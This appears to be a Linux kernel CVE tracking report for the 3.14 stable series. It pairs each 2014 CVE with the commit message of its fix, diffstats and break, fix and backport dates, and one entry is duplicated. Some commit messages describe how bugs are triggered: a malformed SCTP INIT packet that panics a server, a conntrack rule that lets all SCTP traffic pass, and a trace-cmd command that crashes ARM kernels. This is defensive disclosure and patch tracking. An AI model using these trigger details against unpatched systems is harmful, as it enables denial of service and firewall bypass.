commit c88547a8119e3b581318ab65e9b72f27f23e641d
Author: Mark Tinguely <tinguely@sgi.com>
Date:   Fri Apr 4 07:10:49 2014 +1100

    xfs: fix directory hash ordering bug
    
    Commit f5ea1100 ("xfs: add CRCs to dir2/da node blocks") introduced
    in 3.10 incorrectly converted the btree hash index array pointer in
    xfs_da3_fixhashpath(). It resulted in the the current hash always
    being compared against the first entry in the btree rather than the
    current block index into the btree block's hash entry array. As a
    result, it was comparing the wrong hashes, and so could misorder the
    entries in the btree.
    
    For most cases, this doesn't cause any problems as it requires hash
    collisions to expose the ordering problem. However, when there are
    hash collisions within a directory there is a very good probability
    that the entries will be ordered incorrectly and that actually
    matters when duplicate hashes are placed into or removed from the
    btree block hash entry array.
    
    This bug results in an on-disk directory corruption and that results
    in directory verifier functions throwing corruption warnings into
    the logs. While no data or directory entries are lost, access to
    them may be compromised, and attempts to remove entries from a
    directory that has suffered from this corruption may result in a
    filesystem shutdown.  xfs_repair will fix the directory hash
    ordering without data loss occuring.
    
    [dchinner: wrote useful a commit message]
    
    cc: <stable@vger.kernel.org>
    Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: Mark Tinguely <tinguely@sgi.com>
    Reviewed-by: Ben Myers <bpm@sgi.com>
    Signed-off-by: Dave Chinner <david@fromorbit.com>

 fs/xfs/xfs_da_btree.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-10-13
CVE: CVE-2014-7283
Break Date: 2013-04-27
Break Commit: f5ea110044fa858925a880b4fa9f551bfa2dfc38
Break Tag: 3.10
Linus Fix Date: 2014-04-04
Linus Commit: c88547a8119e3b581318ab65e9b72f27f23e641d
Linus Tag: 3.15
Stable Date: 2014-04-26
Stable Commit: 7de24f7b0ddb815d7a8375354a9612264092edcb
Stable Tag: 3.14.2

CVE-2014-7284:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.5.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 3d4405226d27b3a215e4d03cfa51f536244e5de7
Author: Hannes Frederic Sowa <hannes@stressinduktion.org>
Date:   Sun May 11 22:59:30 2014 +0200

    net: avoid dependency of net_get_random_once on nop patching
    
    net_get_random_once depends on the static keys infrastructure to patch up
    the branch to the slow path during boot. This was realized by abusing the
    static keys api and defining a new initializer to not enable the call
    site while still indicating that the branch point should get patched
    up. This was needed to have the fast path considered likely by gcc.
    
    The static key initialization during boot up normally walks through all
    the registered keys and either patches in ideal nops or enables the jump
    site but omitted that step on x86 if ideal nops where already placed at
    static_key branch points. Thus net_get_random_once branches not always
    became active.
    
    This patch switches net_get_random_once to the ordinary static_key
    api and thus places the kernel fast path in the - by gcc considered -
    unlikely path.  Microbenchmarks on Intel and AMD x86-64 showed that
    the unlikely path actually beats the likely path in terms of cycle cost
    and that different nop patterns did not make much difference, thus this
    switch should not be noticeable.
    
    Fixes: a48e42920ff38b ("net: introduce new macro net_get_random_once")
    Reported-by: Tuomas Rsnen <tuomasjjrasanen@tjjr.fi>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/net.h |   15 ++++-----------
 net/core/utils.c    |    8 ++++----
 2 files changed, 8 insertions(+), 15 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-10-13
CVE: CVE-2014-7284
Break Date: 2013-10-19
Break Commit: a48e42920ff38bc90bbf75143fff4555723d4540
Break Tag: 3.13
Linus Fix Date: 2014-05-14
Linus Commit: 3d4405226d27b3a215e4d03cfa51f536244e5de7
Linus Tag: 3.15
Stable Date: 2014-05-31
Stable Commit: adeb3fe4ef6621793d7f1d6f0b9c9cc88827c5b7
Stable Tag: 3.14.5

CVE-2014-7822:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8d0207652cbe27d1f962050737848e5ad4671958
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Sat Apr 5 04:27:08 2014 -0400

    ->splice_write() via ->write_iter()
    
    iter_file_splice_write() - a ->splice_write() instance that gathers the
    pipe buffers, builds a bio_vec-based iov_iter covering those and feeds
    it to ->write_iter().  A bunch of simple cases coverted to that...
    
    [AV: fixed the braino spotted by Cyrill]
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/block_dev.c        |    2 +-
 fs/exofs/file.c       |    2 +-
 fs/ext2/file.c        |    2 +-
 fs/ext3/file.c        |    2 +-
 fs/ext4/file.c        |    2 +-
 fs/f2fs/file.c        |    2 +-
 fs/gfs2/file.c        |    4 +-
 fs/jfs/file.c         |    2 +-
 fs/ramfs/file-mmu.c   |    2 +-
 fs/ramfs/file-nommu.c |    2 +-
 fs/reiserfs/file.c    |    2 +-
 fs/splice.c           |  140 +++++++++++++++++++++++++++++++++++++++++++++++++
 fs/ubifs/file.c       |    2 +-
 fs/xfs/xfs_file.c     |   43 +--------------
 fs/xfs/xfs_trace.h    |    1 -
 include/linux/fs.h    |    2 +
 16 files changed, 156 insertions(+), 56 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2014-7822
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-12
Linus Commit: 8d0207652cbe27d1f962050737848e5ad4671958
Linus Tag: 3.16
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-7825:
CVE-2014-7826:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 086ba77a6db00ed858ff07451bedee197df868c9
Author: Rabin Vincent <rabin@rab.in>
Date:   Wed Oct 29 23:06:58 2014 +0100

    tracing/syscalls: Ignore numbers outside NR_syscalls' range
    
    ARM has some private syscalls (for example, set_tls(2)) which lie
    outside the range of NR_syscalls.  If any of these are called while
    syscall tracing is being performed, out-of-bounds array access will
    occur in the ftrace and perf sys_{enter,exit} handlers.
    
     # trace-cmd record -e raw_syscalls:* true && trace-cmd report
     ...
     true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)
     true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264
     true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)
     true-653   [000]   384.675988: sys_exit:             NR 983045 = 0
     ...
    
     # trace-cmd record -e syscalls:* true
     [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace
     [   17.289590] pgd = 9e71c000
     [   17.289696] [aaaaaace] *pgd=00000000
     [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM
     [   17.290169] Modules linked in:
     [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21
     [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000
     [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8
     [   17.290866] LR is at syscall_trace_enter+0x124/0x184
    
    Fix this by ignoring out-of-NR_syscalls-bounds syscall numbers.
    
    Commit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls"
    added the check for less than zero, but it should have also checked
    for greater than NR_syscalls.
    
    Link: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in
    
    Fixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls"
    Cc: stable@vger.kernel.org # 2.6.33+
    Signed-off-by: Rabin Vincent <rabin@rab.in>
    Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

 kernel/trace/trace_syscalls.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-7825
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-30
Linus Commit: 086ba77a6db00ed858ff07451bedee197df868c9
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 14f83fe6c5d7cc0fcbaad7cbecb862fa48d92086
Stable Tag: 3.14.24

CVE-2014-7825:
CVE-2014-7826:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 086ba77a6db00ed858ff07451bedee197df868c9
Author: Rabin Vincent <rabin@rab.in>
Date:   Wed Oct 29 23:06:58 2014 +0100

    tracing/syscalls: Ignore numbers outside NR_syscalls' range
    
    ARM has some private syscalls (for example, set_tls(2)) which lie
    outside the range of NR_syscalls.  If any of these are called while
    syscall tracing is being performed, out-of-bounds array access will
    occur in the ftrace and perf sys_{enter,exit} handlers.
    
     # trace-cmd record -e raw_syscalls:* true && trace-cmd report
     ...
     true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)
     true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264
     true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)
     true-653   [000]   384.675988: sys_exit:             NR 983045 = 0
     ...
    
     # trace-cmd record -e syscalls:* true
     [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace
     [   17.289590] pgd = 9e71c000
     [   17.289696] [aaaaaace] *pgd=00000000
     [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM
     [   17.290169] Modules linked in:
     [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21
     [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000
     [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8
     [   17.290866] LR is at syscall_trace_enter+0x124/0x184
    
    Fix this by ignoring out-of-NR_syscalls-bounds syscall numbers.
    
    Commit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls"
    added the check for less than zero, but it should have also checked
    for greater than NR_syscalls.
    
    Link: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in
    
    Fixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls"
    Cc: stable@vger.kernel.org # 2.6.33+
    Signed-off-by: Rabin Vincent <rabin@rab.in>
    Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

 kernel/trace/trace_syscalls.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-7825
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-30
Linus Commit: 086ba77a6db00ed858ff07451bedee197df868c9
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 14f83fe6c5d7cc0fcbaad7cbecb862fa48d92086
Stable Tag: 3.14.24

CVE-2014-7841:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.25.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit e40607cbe270a9e8360907cb1e62ddf0736e4864
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Mon Nov 10 17:54:26 2014 +0100

    net: sctp: fix NULL pointer dereference in af->from_addr_param on malformed packet
    
    An SCTP server doing ASCONF will panic on malformed INIT ping-of-death
    in the form of:
    
      ------------ INIT[PARAM: SET_PRIMARY_IP] ------------>
    
    While the INIT chunk parameter verification dissects through many things
    in order to detect malformed input, it misses to actually check parameters
    inside of parameters. E.g. RFC5061, section 4.2.4 proposes a 'set primary
    IP address' parameter in ASCONF, which has as a subparameter an address
    parameter.
    
    So an attacker may send a parameter type other than SCTP_PARAM_IPV4_ADDRESS
    or SCTP_PARAM_IPV6_ADDRESS, param_type2af() will subsequently return 0
    and thus sctp_get_af_specific() returns NULL, too, which we then happily
    dereference unconditionally through af->from_addr_param().
    
    The trace for the log:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000078
    IP: [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp]
    PGD 0
    Oops: 0000 [#1] SMP
    [...]
    Pid: 0, comm: swapper Not tainted 2.6.32-504.el6.x86_64 #1 Bochs Bochs
    RIP: 0010:[<ffffffffa01e9c62>]  [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp]
    [...]
    Call Trace:
     <IRQ>
     [<ffffffffa01f2add>] ? sctp_bind_addr_copy+0x5d/0xe0 [sctp]
     [<ffffffffa01e1fcb>] sctp_sf_do_5_1B_init+0x21b/0x340 [sctp]
     [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]
     [<ffffffffa01e5c09>] ? sctp_endpoint_lookup_assoc+0xc9/0xf0 [sctp]
     [<ffffffffa01e61f6>] sctp_endpoint_bh_rcv+0x116/0x230 [sctp]
     [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]
     [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]
     [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]
     [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0
     [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0
     [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120
     [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0
    [...]
    
    A minimal way to address this is to check for NULL as we do on all
    other such occasions where we know sctp_get_af_specific() could
    possibly return with NULL.
    
    Fixes: d6de3097592b ("[SCTP]: Add the handling of "Set Primary IP Address" parameter to INIT")
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Cc: Vlad Yasevich <vyasevich@gmail.com>
    Acked-by: Neil Horman <nhorman@tuxdriver.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/sm_make_chunk.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-7841
Break Date: 2008-01-28
Break Commit: d6de3097592b7ae7f8e233a4dafb088e2aa8170f
Break Tag: 2.6
Linus Fix Date: 2014-11-11
Linus Commit: e40607cbe270a9e8360907cb1e62ddf0736e4864
Linus Tag: 3.18
Stable Date: 2014-11-21
Stable Commit: 358905266ed83d4a9e693ae7ff86c1595220ec60
Stable Tag: 3.14.25

CVE-2014-7975:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.23.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a1480dcc3c706e309a88884723446f2e84fedd5b
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Wed Oct 8 12:32:47 2014 -0700

    fs: Add a missing permission check to do_umount
    
    Accessing do_remount_sb should require global CAP_SYS_ADMIN, but
    only one of the two call sites was appropriately protected.
    
    Fixes CVE-2014-7975.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>

 fs/namespace.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-10-13
CVE: CVE-2014-7975
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-08
Linus Commit: a1480dcc3c706e309a88884723446f2e84fedd5b
Linus Tag: 3.18
Stable Date: 2014-10-30
Stable Commit: dc3980ea4ad9d8d0b63b3cde732c9b95750208ce
Stable Tag: 3.14.23

CVE-2014-8086:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.33.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a41537e69b4aa43f0fea02498c2595a81267383b
Author: Dmitry Monakhov <dmonakhov@openvz.org>
Date:   Thu Oct 30 10:53:16 2014 -0400

    ext4: prevent bugon on race between write/fcntl
    
    O_DIRECT flags can be toggeled via fcntl(F_SETFL). But this value checked
    twice inside ext4_file_write_iter() and __generic_file_write() which
    result in BUG_ON inside ext4_direct_IO.
    
    Let's initialize iocb->private unconditionally.
    
    TESTCASE: xfstest:generic/036  https://patchwork.ozlabs.org/patch/402445/
    
    #TYPICAL STACK TRACE:
    kernel BUG at fs/ext4/inode.c:2960!
    invalid opcode: 0000 [#1] SMP
    Modules linked in: brd iTCO_wdt lpc_ich mfd_core igb ptp dm_mirror dm_region_hash dm_log dm_mod
    CPU: 6 PID: 5505 Comm: aio-dio-fcntl-r Not tainted 3.17.0-rc2-00176-gff5c017 #161
    Hardware name: Intel Corporation W2600CR/W2600CR, BIOS SE5C600.86B.99.99.x028.061320111235 06/13/2011
    task: ffff88080e95a7c0 ti: ffff88080f908000 task.ti: ffff88080f908000
    RIP: 0010:[<ffffffff811fabf2>]  [<ffffffff811fabf2>] ext4_direct_IO+0x162/0x3d0
    RSP: 0018:ffff88080f90bb58  EFLAGS: 00010246
    RAX: 0000000000000400 RBX: ffff88080fdb2a28 RCX: 00000000a802c818
    RDX: 0000040000080000 RSI: ffff88080d8aeb80 RDI: 0000000000000001
    RBP: ffff88080f90bbc8 R08: 0000000000000000 R09: 0000000000001581
    R10: 0000000000000000 R11: 0000000000000000 R12: ffff88080d8aeb80
    R13: ffff88080f90bbf8 R14: ffff88080fdb28c8 R15: ffff88080fdb2a28
    FS:  00007f23b2055700(0000) GS:ffff880818400000(0000) knlGS:0000000000000000
    CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
    CR2: 00007f23b2045000 CR3: 000000080cedf000 CR4: 00000000000407e0
    Stack:
     ffff88080f90bb98 0000000000000000 7ffffffffffffffe ffff88080fdb2c30
     0000000000000200 0000000000000200 0000000000000001 0000000000000200
     ffff88080f90bbc8 ffff88080fdb2c30 ffff88080f90be08 0000000000000200
    Call Trace:
     [<ffffffff8112ca9d>] generic_file_direct_write+0xed/0x180
     [<ffffffff8112f2b2>] __generic_file_write_iter+0x222/0x370
     [<ffffffff811f495b>] ext4_file_write_iter+0x34b/0x400
     [<ffffffff811bd709>] ? aio_run_iocb+0x239/0x410
     [<ffffffff811bd709>] ? aio_run_iocb+0x239/0x410
     [<ffffffff810990e5>] ? local_clock+0x25/0x30
     [<ffffffff810abd94>] ? __lock_acquire+0x274/0x700
     [<ffffffff811f4610>] ? ext4_unwritten_wait+0xb0/0xb0
     [<ffffffff811bd756>] aio_run_iocb+0x286/0x410
     [<ffffffff810990e5>] ? local_clock+0x25/0x30
     [<ffffffff810ac359>] ? lock_release_holdtime+0x29/0x190
     [<ffffffff811bc05b>] ? lookup_ioctx+0x4b/0xf0
     [<ffffffff811bde3b>] do_io_submit+0x55b/0x740
     [<ffffffff811bdcaa>] ? do_io_submit+0x3ca/0x740
     [<ffffffff811be030>] SyS_io_submit+0x10/0x20
     [<ffffffff815ce192>] system_call_fastpath+0x16/0x1b
    Code: 01 48 8b 80 f0 01 00 00 48 8b 18 49 8b 45 10 0f 85 f1 01 00 00 48 03 45 c8 48 3b 43 48 0f 8f e3 01 00 00 49 83 7c
    24 18 00 75 04 <0f> 0b eb fe f0 ff 83 ec 01 00 00 49 8b 44 24 18 8b 00 85 c0 89
    RIP  [<ffffffff811fabf2>] ext4_direct_IO+0x162/0x3d0
     RSP <ffff88080f90bb58>
    
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>
    Signed-off-by: Dmitry Monakhov <dmonakhov@openvz.org>
    Cc: stable@vger.kernel.org

 fs/ext4/file.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-10-13
CVE: CVE-2014-8086
Break Date: 2014-04-21
Break Commit: 8ad2850f44831919f63f0e58d7203e65d5b3914c
Break Tag: 3.16
Linus Fix Date: 2014-10-30
Linus Commit: a41537e69b4aa43f0fea02498c2595a81267383b
Linus Tag: 3.18
Stable Date: 2015-02-11
Stable Commit: 07110343605adc3f8ddfc0dde38d29d2e0e210a2
Stable Tag: 3.14.33

CVE-2014-8133:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 41bdc78544b8a93a9c6814b8bbbfef966272abbe
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Thu Dec 4 16:48:16 2014 -0800

    x86/tls: Validate TLS entries to protect espfix
    
    Installing a 16-bit RW data segment into the GDT defeats espfix.
    AFAICT this will not affect glibc, Wine, or dosemu at all.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Acked-by: H. Peter Anvin <hpa@zytor.com>
    Cc: stable@vger.kernel.org
    Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: security@kernel.org <security@kernel.org>
    Cc: Willy Tarreau <w@1wt.eu>
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/kernel/tls.c |   23 +++++++++++++++++++++++
 1 file changed, 23 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-12-17
CVE: CVE-2014-8133
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-14
Linus Commit: 41bdc78544b8a93a9c6814b8bbbfef966272abbe
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: aeb83c03a8f584ce0b9386761c22f145caced232
Stable Tag: 3.14.28

CVE-2014-8134:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.28.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 29fa6825463c97e5157284db80107d1bfac5d77b
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Fri Dec 5 19:03:28 2014 -0800

    x86, kvm: Clear paravirt_enabled on KVM guests for espfix32's benefit
    
    paravirt_enabled has the following effects:
    
     - Disables the F00F bug workaround warning.  There is no F00F bug
       workaround any more because Linux's standard IDT handling already
       works around the F00F bug, but the warning still exists.  This
       is only cosmetic, and, in any event, there is no such thing as
       KVM on a CPU with the F00F bug.
    
     - Disables 32-bit APM BIOS detection.  On a KVM paravirt system,
       there should be no APM BIOS anyway.
    
     - Disables tboot.  I think that the tboot code should check the
       CPUID hypervisor bit directly if it matters.
    
     - paravirt_enabled disables espfix32.  espfix32 should *not* be
       disabled under KVM paravirt.
    
    The last point is the purpose of this patch.  It fixes a leak of the
    high 16 bits of the kernel stack address on 32-bit KVM paravirt
    guests.  Fixes CVE-2014-8134.
    
    Cc: stable@vger.kernel.org
    Suggested-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kernel/kvm.c      |    9 ++++++++-
 arch/x86/kernel/kvmclock.c |    1 -
 2 files changed, 8 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-12-12
CVE: CVE-2014-8134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-12-10
Linus Commit: 29fa6825463c97e5157284db80107d1bfac5d77b
Linus Tag: 3.19
Stable Date: 2015-01-08
Stable Commit: c06c656494797804aa7f603df37208b61792d0d1
Stable Tag: 3.14.28

CVE-2014-8159:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.39.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8494057ab5e40df590ef6ef7d66324d3ae33356b
Author: Shachar Raindel <raindel@mellanox.com>
Date:   Wed Mar 18 17:39:08 2015 +0000

    IB/uverbs: Prevent integer overflow in ib_umem_get address arithmetic
    
    Properly verify that the resulting page aligned end address is larger
    than both the start address and the length of the memory area requested.
    
    Both the start and length arguments for ib_umem_get are controlled by
    the user. A misbehaving user can provide values which will cause an
    integer overflow when calculating the page aligned end address.
    
    This overflow can cause also miscalculation of the number of pages
    mapped, and additional logic issues.
    
    Addresses: CVE-2014-8159
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Shachar Raindel <raindel@mellanox.com>
    Signed-off-by: Jack Morgenstein <jackm@mellanox.com>
    Signed-off-by: Or Gerlitz <ogerlitz@mellanox.com>
    Signed-off-by: Roland Dreier <roland@purestorage.com>

 drivers/infiniband/core/umem.c |    8 ++++++++
 1 file changed, 8 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2014-8159
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-04-02
Linus Commit: 8494057ab5e40df590ef6ef7d66324d3ae33356b
Linus Tag: 4.0
Stable Date: 2015-04-19
Stable Commit: f40fc98d0b046ba153442b3bfd7887437f2ebd30
Stable Tag: 3.14.39

CVE-2014-8160:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.40.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit db29a9508a9246e77087c5531e45b2c88ec6988b
Author: Florian Westphal <fw@strlen.de>
Date:   Fri Sep 26 11:35:42 2014 +0200

    netfilter: conntrack: disable generic tracking for known protocols
    
    Given following iptables ruleset:
    
    -P FORWARD DROP
    -A FORWARD -m sctp --dport 9 -j ACCEPT
    -A FORWARD -p tcp --dport 80 -j ACCEPT
    -A FORWARD -p tcp -m conntrack -m state ESTABLISHED,RELATED -j ACCEPT
    
    One would assume that this allows SCTP on port 9 and TCP on port 80.
    Unfortunately, if the SCTP conntrack module is not loaded, this allows
    *all* SCTP communication, to pass though, i.e. -p sctp -j ACCEPT,
    which we think is a security issue.
    
    This is because on the first SCTP packet on port 9, we create a dummy
    "generic l4" conntrack entry without any port information (since
    conntrack doesn't know how to extract this information).
    
    All subsequent packets that are unknown will then be in established
    state since they will fallback to proto_generic and will match the
    'generic' entry.
    
    Our originally proposed version [1] completely disabled generic protocol
    tracking, but Jozsef suggests to not track protocols for which a more
    suitable helper is available, hence we now mitigate the issue for in
    tree known ct protocol helpers only, so that at least NAT and direction
    information will still be preserved for others.
    
     [1] http://www.spinics.net/lists/netfilter-devel/msg33430.html
    
    Joint work with Daniel Borkmann.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Acked-by: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/netfilter/nf_conntrack_proto_generic.c |   26 +++++++++++++++++++++++++-
 1 file changed, 25 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-02
CVE: CVE-2014-8160
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-09-29
Linus Commit: db29a9508a9246e77087c5531e45b2c88ec6988b
Linus Tag: 3.18
Stable Date: 2015-04-29
Stable Commit: efbf300ed821a533c3af71b1b122227febc28142
Stable Tag: 3.14.40

CVE-2014-8369:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 3d32e4dbe71374a6780eaf51d719d76f9a9bf22f
Author: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Date:   Fri Oct 17 22:55:59 2014 +0200

    kvm: fix excessive pages un-pinning in kvm_iommu_map error path.
    
    The third parameter of kvm_unpin_pages() when called from
    kvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin
    and not the page size.
    
    This error was facilitated with an inconsistent API: kvm_pin_pages() takes
    a size, but kvn_unpin_pages() takes a number of pages, so fix the problem
    by matching the two.
    
    This was introduced by commit 350b8bd ("kvm: iommu: fix the third parameter
    of kvm_iommu_put_pages (CVE-2014-3601)"), which fixes the lack of
    un-pinning for pages intended to be un-pinned (i.e. memory leak) but
    unfortunately potentially aggravated the number of pages we un-pin that
    should have stayed pinned. As far as I understand though, the same
    practical mitigations apply.
    
    This issue was found during review of Red Hat 6.6 patches to prepare
    Ksplice rebootless updates.
    
    Thanks to Vegard for his time on a late Friday evening to help me in
    understanding this code.
    
    Fixes: 350b8bd ("kvm: iommu: fix the third parameter of... (CVE-2014-3601)")
    Cc: stable@vger.kernel.org
    Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
    Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com>
    Signed-off-by: Jamie Iles <jamie.iles@oracle.com>
    Reviewed-by: Sasha Levin <sasha.levin@oracle.com>
